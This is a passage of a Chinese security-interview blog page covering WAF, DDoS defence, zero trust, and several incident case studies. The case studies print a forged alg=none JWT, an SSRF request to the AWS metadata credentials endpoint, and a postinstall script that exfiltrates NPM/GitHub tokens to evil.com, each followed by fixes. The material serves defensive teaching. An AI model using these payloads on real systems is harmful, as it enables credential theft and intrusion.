+<li><strong>私有 CA 场景</strong>：企业内网使用私有 CA（自签名根证书），需要在所有内部设备上安装私有根证书。许多生产事故源于根证书过期。</li>
+<li><strong>自签名证书警告</strong>：自签名证书在开发环境方便，但绝不能用于生产。Kubernetes Ingress 的 TLS 配置中应使用 cert-manager + Let’s Encrypt 或外部 CA。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>RFC 5280 - X.509 PKI Certificate and CRL Profile</li>
+<li>Certificate Transparency: <a target="_blank" rel="noopener" href="https://certificate.transparency.dev/">https://certificate.transparency.dev/</a></li>
+<li>SSL&#x2F;TLS 证书验证流程图</li>
+</ul>
+<h3 id="Q32：WAF、DDoS-防御与零信任架构"><a href="#Q32：WAF、DDoS-防御与零信任架构" class="headerlink" title="Q32：WAF、DDoS 防御与零信任架构"></a>Q32：WAF、DDoS 防御与零信任架构</h3><p><strong>标准答案</strong></p>
+<p><strong>WAF（Web Application Firewall）：</strong></p>
+<p>WAF 在应用层对 HTTP&#x2F;HTTPS 流量进行深度检测，防御 OWASP Top 10 等 Web 攻击。</p>
+<table>
+<thead>
+<tr>
+<th>WAF 方案</th>
+<th>类型</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ModSecurity</strong></td>
+<td>开源</td>
+<td>传统规则引擎，CRS 规则集</td>
+</tr>
+<tr>
+<td><strong>Cloudflare WAF</strong></td>
+<td>云 WAF</td>
+<td>托管规则 + 机器学习</td>
+</tr>
+<tr>
+<td><strong>AWS WAF</strong></td>
+<td>云 WAF</td>
+<td>与 ALB&#x2F;CloudFront 原生集成</td>
+</tr>
+<tr>
+<td><strong>Coraza</strong></td>
+<td>开源</td>
+<td>OWASP CRS 兼容，Go 实现，现代架构</td>
+</tr>
+</tbody></table>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ModSecurity + Nginx</span></span><br><span class="line"><span class="attribute">modsecurity</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">modsecurity_rules_file</span> /etc/nginx/modsecurity/main.conf;</span><br><span class="line"></span><br><span class="line"><span class="comment"># CRS 规则示例：SQL 注入检测</span></span><br><span class="line"><span class="attribute">SecRule</span> ARGS <span class="string">&quot;<span class="variable">@detectSQLi</span>&quot;</span> <span class="string">&quot;id:942100,phase:2,deny,status:403&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DDoS 防御层次（纵深防御）：</strong></p>
+<ol>
+<li><strong>网络层（L3&#x2F;L4）</strong>：ISP 级别的流量清洗、BGP FlowSpec、SYN Proxy</li>
+<li><strong>传输层（L4）</strong>：负载均衡器的 SYN Flood 保护、连接数限制</li>
+<li><strong>应用层（L7）</strong>：速率限制、WAF、CAPTCHA 挑战</li>
+<li><strong>CDN 缓存</strong>：静态内容由 CDN 边缘节点响应，源站不受冲击</li>
+</ol>
+<p><strong>DDoS 防护策略：</strong></p>
+<ul>
+<li><strong>自动缩放</strong>：Kubernetes HPA + Cluster Autoscaler 应对流量增长</li>
+<li><strong>Anycast 网络</strong>：流量分散到多个数据中心（Cloudflare 的模型）</li>
+<li><strong>IP 黑&#x2F;白名单</strong>：已知攻击源 IP 列入黑名单</li>
+<li><strong>速率限制</strong>：每 IP、每用户、每 API 的精细限流</li>
+</ul>
+<p><strong>零信任架构（Zero Trust &#x2F; BeyondCorp）：</strong></p>
+<p>核心原则：<strong>永不信任，始终验证</strong>（Never trust, always verify）。</p>
+<ul>
+<li><strong>不再依赖网络边界</strong>（VPN 不再是安全边界）</li>
+<li><strong>所有访问请求必须认证 + 授权</strong>（无论来源是内网还是外网）</li>
+<li><strong>最小权限</strong>：按需授予，用完即释放</li>
+<li><strong>持续验证</strong>：不仅仅是登录时，而是每次请求都验证</li>
+</ul>
+<p>Google 的 BeyondCorp 模型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户 + 设备 → 访问代理 → 信任度评估（用户身份、设备状态、上下文）</span><br><span class="line">    ↓ 通过</span><br><span class="line">    应用（不再有&quot;内网&quot;概念，所有应用对访问代理暴露）</span><br></pre></td></tr></table></figure>
+
+<p><strong>生产实践：</strong></p>
+<ul>
+<li><strong>服务网格（Istio&#x2F;Linkerd）</strong>：服务间的 mTLS + 访问控制策略</li>
+<li><strong>API Gateway</strong>：统一的认证、限流、审计层</li>
+<li><strong>OPA&#x2F;Cedar</strong>：细粒度的策略决策引擎</li>
+<li><strong>IAM + 最小权限</strong>：云资源访问严格控制</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>WAF 的局限性</strong>：WAF 依赖规则匹配，对零日攻击、加密 payload、API 层面的逻辑漏洞（如 IDOR）效果有限。需要配合 RASP（Runtime Application Self-Protection）或 API Security 平台。</li>
+<li><strong>DDoS 的经济账</strong>：DDoS 更像是一种”勒索”而非”入侵”——让服务不可用来谈判。2025 年的 DDoS 攻击峰值已超过 3 Tbps。企业需要购买 DDoS 清洗服务（阿里云 Anti-DDoS、Cloudflare、AWS Shield Advanced）。</li>
+<li><strong>零信任的实施难度</strong>：零信任不仅仅是技术转型，更是组织架构转型。”内网就是安全”的惯性思维需要打破。第一步通常是从”所有内网服务必须认证”开始。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP CRS: <a target="_blank" rel="noopener" href="https://coreruleset.org/">https://coreruleset.org/</a></li>
+<li>Google BeyondCorp Papers</li>
+<li>NIST SP 800-207 (Zero Trust Architecture)</li>
+</ul>
+<hr>
+<h2 id="0x07-生产实战"><a href="#0x07-生产实战" class="headerlink" title="0x07 生产实战"></a>0x07 生产实战</h2><h3 id="Q33：JWT-alg-none-漏洞事故"><a href="#Q33：JWT-alg-none-漏洞事故" class="headerlink" title="Q33：JWT alg&#x3D;none 漏洞事故"></a>Q33：JWT alg&#x3D;none 漏洞事故</h3><p><strong>事故描述</strong></p>
+<p>某金融科技公司的内部管理系统使用 JWT 做 API 认证。在一次安全评估中，发现 JWT 验证代码存在严重漏洞：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 漏洞代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_jwt</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="comment"># 直接传入 header 中的算法，未做限制</span></span><br><span class="line">    payload = jwt.decode(token, key=SECRET_KEY)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击：修改 alg 为 none，删除 signature</span></span><br><span class="line"><span class="comment"># 原始 token：</span></span><br><span class="line"><span class="comment"># eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlcjEyMyIsInJvbGUiOiJ1c2VyIn0.signature</span></span><br><span class="line"><span class="comment"># 攻击后：</span></span><br><span class="line"><span class="comment"># eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者发送 <code>alg: none</code> 的 JWT，服务器跳过签名验证，直接信任 payload 中的内容。攻击者将自己的角色从 <code>user</code> 提升为 <code>admin</code>，访问内部审批模块，审批了 200 万元的转账。</p>
+<p><strong>根因分析：</strong></p>
+<ol>
+<li>JWT 库版本旧（2015 年之前的 <code>jsonwebtoken</code> 默认接受 <code>none</code> 算法）</li>
+<li><code>jwt.decode()</code> 未指定 <code>algorithms</code> 参数</li>
+<li>代码评审未关注安全配置</li>
+</ol>
+<p><strong>修复方案：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修复后</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_jwt</span>(<span class="params">token</span>):</span><br><span class="line">    payload = jwt.decode(</span><br><span class="line">        token,</span><br><span class="line">        key=PUBLIC_KEY,           <span class="comment"># 明确指定公钥</span></span><br><span class="line">        algorithms=[<span class="string">&#x27;RS256&#x27;</span>],     <span class="comment"># 明确指定允许的算法</span></span><br><span class="line">        options=&#123;</span><br><span class="line">            <span class="string">&#x27;verify_signature&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;require&#x27;</span>: [<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;iss&#x27;</span>, <span class="string">&#x27;aud&#x27;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>这不仅仅是一个”改配置”的问题</strong>：为什么代码评审没有发现？因为团队缺乏 JWT 安全最佳实践的知识。需要建立安全编码规范、自动化检测（SAST 工具扫描 <code>jwt.decode</code> 的不安全参数）。</li>
+<li><strong>类似攻击变种</strong>：HMAC&#x2F;RSA 密钥混淆（key confusion）、弱密钥暴力破解、JWK header injection（服务器接受 header 中嵌入的公钥）。</li>
+<li><strong>行业教训</strong>：2015 年 Auth0 的 <code>node-jsonwebtoken</code> 库默认接受 <code>none</code>，影响了大量应用。现在主流库默认拒绝 <code>none</code>，但仍有应用使用旧版本。</li>
+</ul>
+<h3 id="Q34：SSRF-导致内网失陷"><a href="#Q34：SSRF-导致内网失陷" class="headerlink" title="Q34：SSRF 导致内网失陷"></a>Q34：SSRF 导致内网失陷</h3><p><strong>事故描述</strong></p>
+<p>某 SaaS 平台提供了”通过 URL 导入图片”的功能（用户输入 URL → 服务端下载 → 存储到 CDN）。安全团队发现可通过 SSRF 访问 AWS 元数据端点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /api/import-image</span><br><span class="line">&#123;&quot;url&quot;: &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>响应返回了应用服务器 IAM Role 的临时凭证（<code>AccessKeyId</code>、<code>SecretAccessKey</code>、<code>Token</code>）。攻击者使用这些凭证访问了 S3 数据库备份桶，下载了包含用户个人信息（PII）的 500 万条记录。</p>
+<p><strong>根因分析：</strong></p>
+<ol>
+<li>没有 URL 白名单和协议限制（只验证了 MIME 类型）</li>
+<li>没有阻止对内网 IP 段的请求</li>
+<li>AWS 元数据端点 IP（169.254.169.254）未列入黑名单</li>
+<li>IAM Role 权限过大（EC2 Role 拥有 S3 全桶访问权限）</li>
+</ol>
+<p><strong>修复方案：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validate_import_url</span>(<span class="params">url</span>):</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 协议限制</span></span><br><span class="line">    <span class="keyword">if</span> parsed.scheme <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid protocol&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. DNS 解析并检查 IP</span></span><br><span class="line">    hostname = parsed.hostname</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查是否是内网 IP</span></span><br><span class="line">    ip = socket.gethostbyname(hostname)</span><br><span class="line">    <span class="keyword">if</span> is_private_ip(ip):   <span class="comment"># 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Private IP not allowed&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ip == <span class="string">&#x27;169.254.169.254&#x27;</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Metadata endpoint not allowed&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. URL 白名单</span></span><br><span class="line">    ALLOWED_DOMAINS = [<span class="string">&#x27;img.example.com&#x27;</span>, <span class="string">&#x27;cdn.trusted.com&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> hostname <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_DOMAINS:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Domain not allowed&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 二次 DNS 检查（防 DNS Rebinding）</span></span><br><span class="line">    ip_after = socket.gethostbyname(hostname)</span><br><span class="line">    <span class="keyword">if</span> ip != ip_after:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;DNS changed during validation&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>同时需要做的：</strong></p>
+<ul>
+<li>IAM Role 最小权限：应用服务器只需要 S3 指定前缀的 PUT 权限</li>
+<li>网络隔离：应用服务器在私有子网，通过 NAT 出口</li>
+<li>使用 VPC Endpoint 访问 AWS 服务</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>为什么 SSRF 在云时代更危险？</strong> 因为云元数据端点暴露云服务凭据。在物理机房，SSRF 最多打到 Redis&#x2F;ES 等内网服务。在云上，SSRF 可能直接获得云平台的 IAM 凭证。</li>
+<li><strong>SSRF 的防御层次</strong>：没有单一防御能 100% 防住。需要”网络层（防火墙&#x2F;NAT）+ 应用层（URL 校验）+ IAM（最小权限）”三层防御。</li>
+<li><strong>AWS IMDSv2 的作用</strong>：AWS 在 IMDSv2 中引入了 PUT 方法 + TTL 机制，要求先发送 PUT 请求获取 token，再用 token 请求元数据。这能防御大部分 SSRF，但不是万能解药（攻击者可以实现 PUT+GET 两步请求）。</li>
+</ul>
+<h3 id="Q35：API-未限流导致-DDoS-事故"><a href="#Q35：API-未限流导致-DDoS-事故" class="headerlink" title="Q35：API 未限流导致 DDoS 事故"></a>Q35：API 未限流导致 DDoS 事故</h3><p><strong>事故描述</strong></p>
+<p>某电商平台上线了”秒杀”功能，API 设计为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /api/seckill/order</span><br><span class="line">Body: &#123; &quot;productId&quot;: 123 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上线后，攻击者用 10000 个代理 IP 同时请求，每个 IP 每秒发 5 个请求（总计 50000 RPS）。由于没有限流，数据库连接池被耗尽，应用服务器 CPU 100%，数据库死锁。</p>
+<p>更糟糕的是：</p>
+<ul>
+<li>正常用户的所有请求都超时（包括查看商品页面）</li>
+<li>自动扩容触发后也瞬间被打满</li>
+<li>数据库主库彻底 hang 住，持续 2 小时恢复</li>
+</ul>
+<p><strong>根因分析：</strong></p>
+<ol>
+<li>没有全局速率限制</li>
+<li>没有用户级别限流</li>
+<li>没有数据库连接池监控和熔断</li>
+<li>自动扩容策略没有上限</li>
+</ol>
+<p><strong>修复方案：</strong></p>
+<ol>
+<li><strong>三层限流架构</strong>：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 层1：网关级限流（Nginx/API Gateway）</span></span><br><span class="line"><span class="comment"># 每 IP 100 req/min</span></span><br><span class="line">limit_req_zone $binary_remote_addr zone=per_ip:10m rate=100r/m;</span><br><span class="line">limit_req zone=per_ip burst=<span class="number">20</span> nodelay;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 层2：应用级限流（Redis + Lua）</span></span><br><span class="line"><span class="comment"># 每用户 10 req/sec 到秒杀接口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rate_limit</span>(<span class="params">user_id, api_name, max_reqs, window_sec</span>):</span><br><span class="line">    key = <span class="string">f&quot;ratelimit:<span class="subst">&#123;api_name&#125;</span>:<span class="subst">&#123;user_id&#125;</span>&quot;</span></span><br><span class="line">    current = redis.<span class="built_in">eval</span>(SLIDING_WINDOW_LUA, <span class="number">1</span>, key, window_sec, max_reqs, time.time())</span><br><span class="line">    <span class="keyword">return</span> current &lt;= max_reqs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 层3：服务级限流（Hystrix/Sentinel 熔断）</span></span><br><span class="line"><span class="comment"># 当某接口错误率 &gt; 50% 时自动熔断</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p><strong>秒杀接口特殊处理</strong>：</p>
+<ul>
+<li>使用消息队列削峰（请求入队列，异步处理）</li>
+<li>预扣库存（Redis 原子操作），异步落库</li>
+<li>使用 Token Bucket 做准入控制</li>
+</ul>
+</li>
+<li><p><strong>数据库保护</strong>：</p>
+<ul>
+<li>连接池上限（HikariCP max&#x3D;20）</li>
+<li>读写分离（秒杀写走主库，秒杀页读走从库&#x2F;Redis）</li>
+<li>限流到数据库层面（pt-query-digest 监控慢查询）</li>
+</ul>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>限流 vs 熔断 vs 降级</strong>：限流（主动控制入口流量）、熔断（被动保护下游，当出现高错误率&#x2F;高延迟时切断调用）、降级（放弃非核心功能保核心功能）。三者的配合使用至关重要。</li>
+<li><strong>秒杀场景的特殊性</strong>：秒杀本质上是一个”可控的有损”场景——大部分人会失败，但系统不能崩溃。用”漏斗”模式削峰（网关限流 → 队列排队 → 数据库写入），确保系统弹性。</li>
+<li><strong>自动扩容的陷阱</strong>：水平扩容解决的是”流量持续增长”问题，不是”突发 DDoS”问题。突发场景需要限流在前，扩容在后。否则扩容速度跟不上攻击速度。</li>
+</ul>
+<h3 id="Q36：依赖投毒案例-——-供应链攻击"><a href="#Q36：依赖投毒案例-——-供应链攻击" class="headerlink" title="Q36：依赖投毒案例 —— 供应链攻击"></a>Q36：依赖投毒案例 —— 供应链攻击</h3><p><strong>事故描述</strong></p>
+<p>2024 年，某安全研究员在 npm 上发布了 <code>eslint-config</code> 的 typo-squatting 包（<code>eslint-cnofig</code>），伪装成广泛使用的 <code>eslint-config-airbnb</code>。这个恶意包在 <code>postinstall</code> 脚本中执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意 postinstall 脚本</span></span><br><span class="line"><span class="keyword">const</span> token = process.<span class="property">env</span>.<span class="property">NPM_TOKEN</span> || process.<span class="property">env</span>.<span class="property">GITHUB_TOKEN</span>;</span><br><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(</span><br><span class="line">        <span class="string">`curl -X POST https://evil.com/steal?token=<span class="subst">$&#123;token&#125;</span>`</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 同时还包含正常的 eslint config，表面上不破坏功能</span></span><br></pre></td></tr></table></figure>
+
+<p>超过 1000 个项目在 CI&#x2F;CD 中误安装了此包，导致 CI 环境中的 NPM_TOKEN &#x2F; GITHUB_TOKEN 泄露。攻击者通过这些 Token 访问了若干公司的私有仓库，窃取了源码。</p>
+<p><strong>根因分析：</strong></p>
+<ol>
+<li>开发者拼写错误（<code>eslint-cnofig</code> 而不是 <code>eslint-config</code>）</li>
+<li>CI 环境没有限定安装源（允许从公共 npm 安装）</li>
+<li>npm 缺乏包名保护机制（任何人都可以发布类似包名）</li>
+<li>没有锁文件（lockfile）校验，依赖版本被篡改</li>
+<li>没有扫描 CI 中是否有敏感环境变量</li>
+</ol>
+<p><strong>修复方案：</strong></p>
+<ol>
+<li><strong>包名验证</strong>：在 <code>package.json</code> 中使用 <code>&quot;allowedPubilshConfig&quot;</code> 或 <code>--registry</code> 限定源</li>
+<li><strong>锁文件</strong>：提交 <code>package-lock.json</code> 并 CI 中校验 <code>npm ci</code>（而非 <code>npm install</code>）</li>
+<li><strong>CI 环境变量最小化</strong>：不在 CI 中存储不需要的 Token</li>
+<li><strong>依赖扫描</strong>：CI 中集成 <code>npm audit</code> 或 Snyk 扫描</li>
+<li><strong>作用域包（Scoped Packages）</strong>：使用 <code>@mycompany/</code> 命名空间</li>
+<li><strong>Registry 配置</strong>：明确指定私有 npm 源</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .npmrc</span></span><br><span class="line">registry=https://registry.npmjs.org/</span><br><span class="line">@mycompany:registry=https://npm.mycompany.com/</span><br><span class="line"></span><br><span class="line"><span class="comment"># CI 配置</span></span><br><span class="line">npm ci --registry=https://registry.mycompany.com/ 2&gt;&amp;1 | grep -v <span class="string">&quot;WARN&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Typo-squatting 远不止 npm</strong>：PyPI、RubyGems、Maven Central 都发现过类似攻击。PyPI 上的 <code>request</code>（拼写错误，正确是 <code>requests</code>）下载量数万次。</li>
+<li><strong>维护者账户投毒</strong>：比 typo-squatting 更危险的是”劫持已有维护者账户”。攻击者通过钓鱼&#x2F;社工获取维护者权限，向长期维护的包注入恶意代码。<code>event-stream</code>（npm，2018）和 <code>colors.js</code>（2022）事件就是如此。</li>
+<li><strong>防投毒检查清单</strong>：<ul>
+<li><input disabled="" type="checkbox"> 是否使用 lockfile？</li>
+<li><input disabled="" type="checkbox"> CI 是否使用 <code>npm ci</code>&#x2F;<code>pip install --require-hashes</code>？</li>
+<li><input disabled="" type="checkbox"> 是否限制了安装源（scope registry）？</li>
+<li><input disabled="" type="checkbox"> 是否有 postinstall 脚本审计？</li>
+<li><input disabled="" type="checkbox"> 是否扫描已知的 typo-squatting 包？</li>
+<li><input disabled="" type="checkbox"> 是否启用了 2FA&#x2F;MFA 保护发布者账户？</li>
+<li><input disabled="" type="checkbox"> 是否使用 sigstore&#x2F;cosign 验证包签名？</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p><strong>总结</strong>：供应链安全是 2025 年 OWASP Top 10 中上升到 #3 的风险类别（A03:2025 - Software Supply Chain Failures）。每个资深研发都需要有”我的依赖可能是安全的”危机感，并通过 SBOM、签名、锁文件、最小权限构建起多层防御。</p>
+</blockquote>
+<hr>
+<h2 id="参考资料汇总"><a href="#参考资料汇总" class="headerlink" title="参考资料汇总"></a>参考资料汇总</h2><ul>
+<li>OWASP Top 10:2025 - <a target="_blank" rel="noopener" href="https://owasp.org/Top10/2025/">https://owasp.org/Top10/2025/</a></li>
+<li>RFC 6749 (OAuth 2.0) &#x2F; RFC 7636 (PKCE) &#x2F; RFC 9700 (OAuth BCP)</li>
+<li>RFC 7519 (JWT) &#x2F; RFC 7515 (JWS) &#x2F; RFC 7516 (JWE)</li>
+<li>OpenID Connect Core 1.0 Specification</li>
+<li>NIST SP 800-207 (Zero Trust Architecture)</li>
+<li>HashiCorp Vault Documentation</li>
+<li>Sigstore &#x2F; Cosign Documentation</li>
+<li>Google BeyondCorp Papers</li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>关于作者</strong>：本文面向全栈资深研发，聚焦研发视角下必须掌握的安全工程知识体系，涵盖认证授权、权限模型、Web 安全、API 安全、密钥管理、供应链安全、网络安全及生产实战事故分析。建议结合自身项目实践反复对照，构建实战级安全能力。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag"># 面试题</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+              <a href="/tags/OAuth/" rel="tag"># OAuth</a>
+              <a href="/tags/JWT/" rel="tag"># JWT</a>
+              <a href="/tags/API%E5%AE%89%E5%85%A8/" rel="tag"># API安全</a>
+              <a href="/tags/OWASP/" rel="tag"># OWASP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/06/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%9D%A2%E8%AF%95%E9%A2%98-Redis-%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3/" rel="prev" title="数据库面试题：Redis 面试全解">
+                  <i class="fa fa-angle-left"></i> 数据库面试题：Redis 面试全解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/06/13/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98-Go-%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3/" rel="next" title="后端面试题：Go 面试全解">
+                  后端面试题：Go 面试全解 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">xiaoxin1024</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/liuerge" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
